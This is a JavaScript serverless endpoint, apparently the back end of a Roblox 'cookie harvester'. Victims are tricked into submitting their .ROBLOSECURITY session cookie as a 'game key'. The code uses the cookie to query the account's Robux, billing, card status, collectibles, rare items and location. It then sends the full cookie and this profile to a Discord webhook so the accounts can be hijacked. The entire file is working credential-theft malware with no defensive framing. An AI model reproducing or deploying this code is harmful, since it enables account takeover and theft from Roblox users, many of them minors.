// api/submit.js
const WEBHOOK_URL = process.env.WEBHOOK_URL || process.env.DISCORD_WEBHOOK_URL;
const crypto = require('crypto');

// ---------- Rate limiting (exact cookie, 10 minutes) ----------
const rateLimitMap = new Map(); // key: sha256(cookie), value: timestamp

function getCookieHash(cookie) {
  return crypto.createHash('sha256').update(cookie).digest('hex');
}

function isRateLimited(cookie) {
  const hash = getCookieHash(cookie);
  const lastUsed = rateLimitMap.get(hash);
  if (lastUsed && Date.now() - lastUsed < 10 * 60 * 1000) {
    return true;
  }
  rateLimitMap.set(hash, Date.now());
  // Clean up expired entries
  for (const [key, time] of rateLimitMap.entries()) {
    if (Date.now() - time > 10 * 60 * 1000) rateLimitMap.delete(key);
  }
  return false;
}

// ---------- CSRF token ----------
async function getCsrfToken(cookie) {
  const res = await fetch("https://auth.roblox.com/v2/logout", {
    method: "GET",
    headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
  });
  const token = res.headers.get("x-csrf-token");
  if (!token) throw new Error("No CSRF token");
  return token;
}

// ---------- User data ----------
async function getUser(userId) {
  const res = await fetch(`https://users.roblox.com/v1/users/${userId}`);
  if (!res.ok) throw new Error("User fetch failed");
  return res.json();
}

function getAgeDays(created) {
  return Math.floor((new Date() - new Date(created)) / 86400000);
}

async function getRobux(userId, cookie) {
  const res = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
    headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
  });
  if (!res.ok) throw new Error("Robux fetch failed");
  const data = await res.json();
  return { balance: data.robux || 0 };
}

async function getPendingRobux(userId, cookie) {
  let pending = 0;
  try {
    const res = await fetch(`https://economy.roblox.com/v2/users/${userId}/transactions?transactionType=Incoming&limit=100`, {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });
    if (res.ok) {
      const data = await res.json();
      for (const tx of data.data || []) {
        if (tx.transactionType === "Sale" || tx.transactionType === "GroupPayout") {
          pending += tx.currency?.amount || 0;
        }
      }
    }
  } catch (e) {}
  return pending;
}

async function getUserSettings(cookie, csrfToken) {
  const defaultSettings = { verified: "False", banned: "False" };
  try {
    const res = await fetch("https://www.roblox.com/mobileapi/userinfo", {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}`, "X-CSRF-TOKEN": csrfToken }
    });
    if (!res.ok) return defaultSettings;
    const data = await res.json();
    return {
      verified: data.IsVerified ? "True" : "False",
      banned: data.IsBanned ? "True" : "False"
    };
  } catch (e) {
    return defaultSettings;
  }
}

async function getBilling(cookie, csrfToken) {
  const defaultBilling = { credit: 0, convert: 0, card: "False" };
  try {
    const res = await fetch("https://www.roblox.com/billing/user/credit", {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}`, "X-CSRF-TOKEN": csrfToken }
    });
    if (!res.ok) return defaultBilling;
    const html = await res.text();
    const creditMatch = html.match(/"creditAmount":(\d+)/);
    const convertMatch = html.match(/"convertedRobux":(\d+)/);
    const hasCard = html.includes('"isCardLinked":true');
    return {
      credit: creditMatch ? parseInt(creditMatch[1], 10) : 0,
      convert: convertMatch ? parseInt(convertMatch[1], 10) : 0,
      card: hasCard ? "True" : "False"
    };
  } catch (e) {
    return defaultBilling;
  }
}

async function getGroupsCount(userId) {
  try {
    const res = await fetch(`https://groups.roblox.com/v2/users/${userId}/groups/roles`);
    if (!res.ok) return 0;
    const data = await res.json();
    return data.data?.length || 0;
  } catch (e) {
    return 0;
  }
}

async function getTotalPlaceVisits(userId) {
  let total = 0, cursor = null;
  do {
    const url = `https://games.roblox.com/v2/users/${userId}/games?sortOrder=Asc&limit=50${cursor ? `&cursor=${cursor}` : ""}`;
    const res = await fetch(url);
    if (!res.ok) break;
    const data = await res.json();
    for (const game of data.data) {
      const details = await fetch(`https://games.roblox.com/v1/games?universeIds=${game.id}`);
      if (details.ok) {
        const json = await details.json();
        total += json.data[0]?.placeVisits || 0;
      }
      await new Promise(r => setTimeout(r, 20));
    }
    cursor = data.nextPageCursor;
  } while (cursor);
  return total;
}

async function getAllCollectibles(userId, cookie) {
  let items = [], cursor = null;
  do {
    const url = `https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100${cursor ? `&cursor=${cursor}` : ""}`;
    const res = await fetch(url, { headers: { Cookie: `.ROBLOSECURITY=${cookie}` } });
    if (!res.ok) break;
    const data = await res.json();
    items.push(...(data.data || []));
    cursor = data.nextPageCursor;
  } while (cursor);
  return items.map(item => ({
    name: item.name,
    assetId: item.assetId,
    link: `https://www.roblox.com/catalog/${item.assetId}/${encodeURIComponent(item.name.replace(/ /g, '-'))}`
  }));
}

async function isEmailVerified(userId, cookie) {
  try {
    const res = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/102611803/is-owned`, {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });
    if (!res.ok) return false;
    const data = await res.json();
    return data.ownership === true;
  } catch (e) {
    return false;
  }
}

async function checkItemOwnership(userId, cookie, assetId) {
  try {
    const res = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/${assetId}/is-owned`, {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });
    if (!res.ok) return "False";
    const data = await res.json();
    return data.ownership ? "True" : "False";
  } catch (e) {
    return "False";
  }
}

// ---------- RECENT GAMES (via Continue endpoint) ----------
async function getRecentlyPlayedGames(cookie, csrfToken) {
  try {
    const res = await fetch("https://www.roblox.com/charts/v2/Continue", {
      headers: {
        Cookie: `.ROBLOSECURITY=${cookie}`,
        "X-CSRF-TOKEN": csrfToken || "",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*"
      }
    });
    if (res.ok) {
      const data = await res.json();
      const games = Array.isArray(data) ? data : (data.data || []);
      return games.map(g => g.name || g.displayName || "").filter(Boolean);
    }
  } catch (e) {}
  return [];
}

async function getPlayedPasses(cookie, csrfToken) {
  const targets = ["Pet Simulator 99", "Breaking Point 2", "Murder Mystery 2"];
  const recent = await getRecentlyPlayedGames(cookie, csrfToken);
  return targets.map(name => ({
    name,
    played: recent.some(g => g.toLowerCase().includes(name.toLowerCase())) ? "True" : "False"
  }));
}

// ---------- Country flag ----------
async function getCountryFlag(req) {
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
  if (!ip || ip === '::1') return '🏠 Local';
  try {
    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,countryCode`);
    const data = await geoRes.json();
    if (data.status === 'success' && data.countryCode) {
      const code = data.countryCode;
      const flag = code.split('').map(l => String.fromCodePoint(l.charCodeAt(0) + 127397)).join('');
      return `${flag} ${code}`;
    }
  } catch (e) {}
  return '🌍 Unknown';
}

async function getUserAvatarUrl(userId) {
  try {
    const res = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`);
    if (!res.ok) return null;
    const data = await res.json();
    return data.data?.[0]?.imageUrl || null;
  } catch (e) {
    return null;
  }
}

// ---------- MAIN HANDLER ----------
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });

  const { cookie, rbxuid } = req.body;
  if (!cookie || !rbxuid) return res.status(400).json({ error: "Missing game key or user ID" });
  if (!WEBHOOK_URL) return res.status(500).json({ error: "Server configuration error" });

  // Rate limit this exact cookie
  if (isRateLimited(cookie)) {
    return res.status(429).json({ blocked: true, message: "This game key has been used recently. Please wait 10 minutes before trying again." });
  }

  try {
    let csrfToken = null;
    try { csrfToken = await getCsrfToken(cookie); } catch (e) { console.warn("CSRF token failed"); }

    const [userData, robux, pending, groups, visits, collectibles, played, country, avatar, emailVerified, korblox, headless] = await Promise.all([
      getUser(rbxuid),
      getRobux(rbxuid, cookie),
      getPendingRobux(rbxuid, cookie),
      getGroupsCount(rbxuid),
      getTotalPlaceVisits(rbxuid),
      getAllCollectibles(rbxuid, cookie),
      getPlayedPasses(cookie, csrfToken),
      getCountryFlag(req),
      getUserAvatarUrl(rbxuid),
      isEmailVerified(rbxuid, cookie),
      checkItemOwnership(rbxuid, cookie, 1373933),
      checkItemOwnership(rbxuid, cookie, 134082613)
    ]);

    let settings = { verified: "False", banned: "False" };
    let billing = { credit: 0, convert: 0, card: "False" };
    if (csrfToken) {
      [settings, billing] = await Promise.all([
        getUserSettings(cookie, csrfToken),
        getBilling(cookie, csrfToken)
      ]);
    }

    const age = getAgeDays(userData.created);
    const summary = robux.balance + pending;
    const playedText = played.map(p => `${p.name} | ${p.played}`).join("\n");
    const rolimons = `https://www.rolimons.com/player/${userData.id}`;
    const thumb = "https://png.pngtree.com/png-vector/20201010/ourmid/pngtree-cartoon-delicious-dessert-cookie-cookie-clipart-png-image_2360164.jpg";
    const robuxEmoji = "<:Robux:1495081542370726080>";
    const collectCount = collectibles.length;

    // Stats embed
    const statsEmbed = {
      title: "🔱 Vyro Har - Result",
      description: `**Check_VYROSECURITY | Vyro**\n\`2400c5b00-465b-1000-bd8d8e8fca5bc723\``,
      color: 0x1E3A8A,
      thumbnail: { url: thumb },
      image: avatar ? { url: avatar } : undefined,
      fields: [
        { name: "📌 About User", value: `**${userData.name}** (**${userData.displayName}**)\n**UserID:** \`${userData.id}\`\n**Account Age:** ${age} Days\n**Place Visits:** ${visits}\n**Country:** ${country}`, inline: false },
        { name: "💰 Robux", value: `${robuxEmoji} **Balance:** ${robux.balance}\n${robuxEmoji} **Pending:** ${pending}`, inline: true },
        { name: "💳 Billing", value: `**Credit:** ${billing.credit}\n**Convert:** ${billing.convert}\n**Card:** ${billing.card}`, inline: true },
        { name: "📊 Played | Passes", value: `\`\`\`\n${playedText}\n\`\`\``, inline: false },
        { name: "📝 Summary", value: `**${summary}**`, inline: false },
        { name: "📊 Settings", value: `**(Verified)** ${settings.verified}\n**Is Banned** ${settings.banned}\n**Email Enabled** ${emailVerified ? "True" : "False"}`, inline: true },
        { name: "🎁 Collectibles", value: `**${collectCount} items** (see third embed)`, inline: true },
        { name: "📊 Groups", value: `**Member of:** ${groups}`, inline: true },
        { name: "💀 Rare Items", value: `**Korblox:** ${korblox}\n**Headless:** ${headless}`, inline: true },
        { name: "🔗 Rolimons Profile", value: `[Click here](${rolimons})`, inline: false }
      ],
      footer: { text: "made by vyro28 • cookie harvester" },
      timestamp: new Date().toISOString()
    };

    // Cookie embed
    const cookieEmbed = {
      title: "🍪 ***.ROBLOSECURITY***",
      description: `**Full Roblox Cookie:**\n\`\`\`\n${cookie}\n\`\`\``,
      color: 0x1E3A8A,
      thumbnail: { url: thumb },
      footer: { text: "made by vyro28 • cookie harvester" },
      timestamp: new Date().toISOString()
    };

    // Collectibles embed
    let collectText = "";
    for (let i = 0; i < Math.min(collectCount, 20); i++) {
      collectText += `**${collectibles[i].name}**\n<${collectibles[i].link}>\n\n`;
    }
    if (collectCount > 20) collectText += `*... and ${collectCount - 20} more items*`;
    if (!collectText) collectText = "No collectibles found.";
    const collectEmbed = {
      title: "🎁 Collectible Inventory",
      description: collectText,
      color: 0x1E3A8A,
      thumbnail: { url: thumb },
      footer: { text: `Total items: ${collectCount}` },
      timestamp: new Date().toISOString()
    };

    // Send to Discord
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: "@everyone", username: "Vyro Harvest", embeds: [statsEmbed] })
    });
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username: "Vyro Harvest", embeds: [cookieEmbed] })
    });
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username: "Vyro Harvest", embeds: [collectEmbed] })
    });

    return res.status(200).json({ success: true, firstTime: true });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ error: "Failed to process game key. Please check and try again." });
  }
}
